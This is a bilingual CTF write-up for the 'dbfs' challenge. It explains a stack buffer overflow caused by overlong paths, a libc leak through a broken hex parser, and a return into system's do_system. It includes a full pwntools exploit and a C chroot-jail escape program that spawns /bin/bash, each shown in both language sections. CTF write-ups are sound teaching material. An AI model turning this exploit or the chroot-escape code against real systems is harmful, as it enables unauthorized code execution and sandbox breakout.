---
title: 2025-cykor-ctf-dbfs
title_ko: 2025-cykor-ctf-dbfs
lang: en
draft: false
date: 2026-02-18
tags:
  - chroot-jail
  - stack-based-BOF
  - writeup
description: dbfs writeup
description_ko: dbfs writeup
---

[lang:ko]
[여기](https://dreamhack.io/wargame/challenges/2511)에서 이 문제를 풀어보실 수 있습니다.

# 핵심 아이디어

1. [[PATH_MAX]] 보다 긴 path를 만들 수 있다.
   ref) https://insanecoding.blogspot.com/2007/11/pathmax-simply-isnt.html
2. [[chroot|chroot]] 를 빈 디렉토리로 했고, 임의 경로에 임의 내용을 쓸 수 있다.
   => 내가 원하는 /bin/sh 를 만들 수 있다.

# 취약점

1. 경로를 [[PATH_MAX|PATH_MAX]] 보다 길게 만들어서 BOF 를 트리거할 수 있다.

   ```c
   void handle_info(const char *name)
   {
      struct stat stat_buf;
      char type_str[16] = {0, };
      enum dbfs_value_type type;
      char full_path[PATH_MAX + 1];
      int ret;

      if (strchr(name, '/'))
   	   return;

      ret = stat(name, &stat_buf);
      if (ret < 0)
   	   fatal("stat");

      ret = getxattr(name, "user.type", type_str, sizeof(type_str));
      if (ret < 0)
   	   fatal("getxattr");

      type = dbfs_type_string_to_enum(type_str);
      if (type == DBFS_VALUE_TYPE_UNKNOWN)
   	   fatal("dbfs_type_string_to_enum");

      getcwd(full_path, sizeof(full_path));
      strcat(full_path, "/");
      strcat(full_path, name); // <= stack-based buffer overflow

      printf("-------------- Info --------------\n");
      printf("Name: %s\n", name);
      printf("Full Path: %s\n", full_path);
      printf("Type: %s\n", type_str);
      printf("Size: %ld\n", stat_buf.st_size);
      printf("Owner UID: %d\n", stat_buf.st_uid);
      printf("Owner GID: %d\n", stat_buf.st_gid);
      printf("Mode: %o\n", stat_buf.st_mode);
      printf("----------------------------------\n");
   }
   ```

2. sscanf 에 유효하지 않은 hexstring을 넣어서 sscanf 를 no-op로 바꿀 수 있다.

   ```c
   int hex2bytes(const char *hexstr, char **out, size_t *out_size)
   {
       size_t hexstr_len = strlen(hexstr);
       if (hexstr_len == 0 || hexstr_len % 2 != 0)
           return -1;

       size_t bytes_len = hexstr_len / 2;
       char *bytes = malloc(bytes_len);
       if (!bytes)
           return -1;

       for (size_t i = 0; i < bytes_len; i++)
           sscanf(hexstr + 2 * i, "%2hhx", &bytes[i]);

       *out_size = bytes_len;
       *out = bytes;

       return 0;
   }
   ```

# Exploit 전략

1. 취약점 \#2 를 이용해서 libc 주소를 얻는다.
2. [[chroot|chroot]] jail을 탈출할 수 있도록 하는 `/bin/sh` 를 미리 만들어둔다.
3. oneshot gadget을 사용하기는 힘들지만, 핵심 아이디어 \#2 를 염두에 두고 생각해보면 system 내부에 있는 `do_system ("exit 0")` 으로 RIP를 바꾸면 결국 `execve("/bin/sh", ["/bin/sh", "-c", "exit", "0"], environ)` 이 실행되어 [[chroot|chroot]] jail을 탈출 할 수 있다.

   ```c
   int
   __libc_system (const char *line)
   {
     if (line == NULL)
       /* Check that we have a command processor available.  It might
          not be available after a chroot(), for example.  */
       return do_system ("exit 0") == 0;

     return do_system (line);
   }
   weak_alias (__libc_system, system)
   ```

# 전체 Exploit

## ex.py

```python
from pwn import *
import os

context.update(
    arch="amd64",
    os="linux",
    terminal=["sudo", "konsole", "-e", "zsh", "-c"]
)

HOST, PORT = "localhost 22222".split()
HOST, PORT = "host3.dreamhack.games 12277".split()

# e = ELF("prob")

os.system("musl-gcc -o ex ex.c -static")

with open("ex", "rb") as f:
    exploit = f.read()

print(hex(len(exploit)))

if args.REMOTE:
    p = remote(HOST, PORT)
    # l = ELF("./libc.so.6")
else:
    # p = process("../public/debug.sh", shell=True)
    p = process("../public/client")

    # gdb.attach(p)
    # l = e.libc

p.sendlineafter(b"dbfs> ", f"SET spray bytes {'00'*0x20} {'A'*0x1000}".encode())
p.sendlineafter(b"dbfs> ", f"SET leak bytes {'--'*0x500}".encode())
p.sendlineafter(b"dbfs> ", b"GET leak")

p.recvuntil(b"Value (hex): ")
libcbase = u64(bytes.fromhex(p.recvn(16).decode())) - 0x204130
log.info("libcbase: %#lx", libcbase)

p.sendlineafter(b"dbfs> ", f"SET bin set".encode())
p.sendlineafter(b"dbfs> ", f"CHDIR bin".encode())
p.sendlineafter(b"dbfs> ", f"SET sh bytes {exploit.hex()}".encode())
p.sendlineafter(b"dbfs> ", f"CHDIR ..".encode())

name = "A"*255

for _ in range(0x10):
    p.sendlineafter(b"dbfs> ", f"SET {name} set".encode())
    p.sendlineafter(b"dbfs> ", f"CHDIR {name}".encode())

name = b"B"*0xc7
name += p64(libcbase + 0x58764)[:6]
p.sendlineafter(b"dbfs> ", b"SET " + name + b" null")
p.sendlineafter(b"dbfs> ", b"INFO " + name)

p.interactive()
```

## ex.c

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

int main(int argc, char *argv[])
{
    int ret;

    ret = mkdir("escape", 0755);
    if (ret < 0)
        perror("mkdir");

    ret = chroot("escape");
    if (ret < 0)
        perror("chroot");

    for (int i = 0; i < 1000; i++) {
        ret = chdir("..");
        if (ret < 0)
            perror("chdir");
    }

    ret = chroot(".");
    if (ret < 0)
        perror("chroot");

    ret = execl("/bin/bash", "/bin/bash", NULL);
    if (ret < 0)
        perror("execve");

    sleep(100);

    return 0;
}
```

[lang:en]

> [!warning] This post was translated by an LLM. If you would like to read the original, please click the globe icon in the top-left corner.

You can try solving this challenge [here](https://dreamhack.io/wargame/challenges/2511).

# Key Ideas

1. It is possible to create a path longer than [[PATH_MAX|PATH_MAX]].
   ref) https://insanecoding.blogspot.com/2007/11/pathmax-simply-isnt.html
2. The service performs [[chroot|chroot]] into an empty directory, and we can write arbitrary content to arbitrary paths.
   => We can create our own `/bin/sh`.

# Vulnerabilities

1. By building a path longer than [[PATH_MAX|PATH_MAX]], we can trigger a BOF.

   ```c
   void handle_info(const char *name)
   {
       struct stat stat_buf;
       char type_str[16] = {0, };
       enum dbfs_value_type type;
       char full_path[PATH_MAX + 1];
       int ret;

       if (strchr(name, '/'))
           return;

       ret = stat(name, &stat_buf);
       if (ret < 0)
           fatal("stat");

       ret = getxattr(name, "user.type", type_str, sizeof(type_str));
       if (ret < 0)
           fatal("getxattr");

       type = dbfs_type_string_to_enum(type_str);
       if (type == DBFS_VALUE_TYPE_UNKNOWN)
           fatal("dbfs_type_string_to_enum");

       getcwd(full_path, sizeof(full_path));
       strcat(full_path, "/");
       strcat(full_path, name); // <= stack-based buffer overflow

       printf("-------------- Info --------------\n");
       printf("Name: %s\n", name);
       printf("Full Path: %s\n", full_path);
       printf("Type: %s\n", type_str);
       printf("Size: %ld\n", stat_buf.st_size);
       printf("Owner UID: %d\n", stat_buf.st_uid);
       printf("Owner GID: %d\n", stat_buf.st_gid);
       printf("Mode: %o\n", stat_buf.st_mode);
       printf("----------------------------------\n");
   }
   ```

2. By feeding an invalid hex string, we can effectively turn `sscanf` into a no-op.

   ```c
   int hex2bytes(const char *hexstr, char **out, size_t *out_size)
   {
       size_t hexstr_len = strlen(hexstr);
       if (hexstr_len == 0 || hexstr_len % 2 != 0)
           return -1;

       size_t bytes_len = hexstr_len / 2;
       char *bytes = malloc(bytes_len);
       if (!bytes)
           return -1;

       for (size_t i = 0; i < bytes_len; i++)
           sscanf(hexstr + 2 * i, "%2hhx", &bytes[i]);

       *out_size = bytes_len;
       *out = bytes;

       return 0;
   }
   ```

# Exploit Strategy

1. Use vulnerability #2 to leak a libc address.
2. Pre-create a `/bin/sh` binary that can escape the [[chroot|chroot]] jail.
3. A one-shot gadget is hard to use here, but with key idea #2 in mind, we can redirect RIP to `do_system("exit 0")` inside `system`. This eventually runs `execve("/bin/sh", ["/bin/sh", "-c", "exit", "0"], environ)`, which allows us to break out of the [[chroot|chroot]] jail.

   ```c
   int
   __libc_system (const char *line)
   {
     if (line == NULL)
       /* Check that we have a command processor available.  It might
          not be available after a chroot(), for example.  */
       return do_system ("exit 0") == 0;

     return do_system (line);
   }
   weak_alias (__libc_system, system)
   ```

# Full Exploit

## ex.py

```python
from pwn import *
import os

context.update(
    arch="amd64",
    os="linux",
    terminal=["sudo", "konsole", "-e", "zsh", "-c"]
)

HOST, PORT = "localhost 22222".split()
HOST, PORT = "host3.dreamhack.games 12277".split()

# e = ELF("prob")

os.system("musl-gcc -o ex ex.c -static")

with open("ex", "rb") as f:
    exploit = f.read()

print(hex(len(exploit)))

if args.REMOTE:
    p = remote(HOST, PORT)
    # l = ELF("./libc.so.6")
else:
    # p = process("../public/debug.sh", shell=True)
    p = process("../public/client")

    # gdb.attach(p)
    # l = e.libc

p.sendlineafter(b"dbfs> ", f"SET spray bytes {'00'*0x20} {'A'*0x1000}".encode())
p.sendlineafter(b"dbfs> ", f"SET leak bytes {'--'*0x500}".encode())
p.sendlineafter(b"dbfs> ", b"GET leak")

p.recvuntil(b"Value (hex): ")
libcbase = u64(bytes.fromhex(p.recvn(16).decode())) - 0x204130
log.info("libcbase: %#lx", libcbase)

p.sendlineafter(b"dbfs> ", f"SET bin set".encode())
p.sendlineafter(b"dbfs> ", f"CHDIR bin".encode())
p.sendlineafter(b"dbfs> ", f"SET sh bytes {exploit.hex()}".encode())
p.sendlineafter(b"dbfs> ", f"CHDIR ..".encode())

name = "A"*255

for _ in range(0x10):
    p.sendlineafter(b"dbfs> ", f"SET {name} set".encode())
    p.sendlineafter(b"dbfs> ", f"CHDIR {name}".encode())

name = b"B"*0xc7
name += p64(libcbase + 0x58764)[:6]
p.sendlineafter(b"dbfs> ", b"SET " + name + b" null")
p.sendlineafter(b"dbfs> ", b"INFO " + name)

p.interactive()
```

## ex.c

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

int main(int argc, char *argv[])
{
    int ret;

    ret = mkdir("escape", 0755);
    if (ret < 0)
        perror("mkdir");

    ret = chroot("escape");
    if (ret < 0)
        perror("chroot");

    for (int i = 0; i < 1000; i++) {
        ret = chdir("..");
        if (ret < 0)
            perror("chdir");
    }

    ret = chroot(".");
    if (ret < 0)
        perror("chroot");

    ret = execl("/bin/bash", "/bin/bash", NULL);
    if (ret < 0)
        perror("execve");

    sleep(100);

    return 0;
}
```
